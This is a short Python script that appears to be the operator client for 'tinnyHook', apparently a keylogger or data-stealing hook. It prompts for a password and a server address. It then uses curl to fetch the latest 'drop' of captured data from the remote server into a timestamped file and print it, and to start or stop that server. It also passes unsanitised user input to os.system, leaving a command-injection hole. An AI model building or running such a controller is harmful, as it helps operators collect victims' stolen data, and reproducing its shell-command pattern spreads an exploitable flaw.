#!/usr/bin/python3

import getpass
from os import system
from datetime import datetime


if __name__ == '__main__':
    passwd = getpass.getpass("CH_PASSWD >>> ")
    server = input("IP_ADDRESS:PORT >>> ")
    while True:
        print("============================")
        print("tinnyHook Client Interface")
        print("============================")
        print("grabz  ::  show latest drop")
        print("start  ::  start server")
        print("stop  ::  stop server")
        print("============================")
        x = input("CMD >>> ")
        print("============================")
        if x == "grabz":
            now = datetime.now() 
            current_time = now.strftime("%H:%M:%S")
            file = f"drop-{current_time}.txt"
            cmd = f"curl http://{server}/?passwd={passwd} > {file}"
            print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
            system(cmd)
            print("--------------------------------")
            system(f"cat {file}")
            print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
        elif x == "start":
            print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
            cmd = f"curl http://{server}/start?passwd={passwd}"
            system(cmd)
            print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
        elif x == "stop":
            print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
            cmd = f"curl http://{server}/stop?passwd={passwd}"
            system(cmd)
            print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
        else:
            print("Gracefully quitting...")
            exit(0)
    
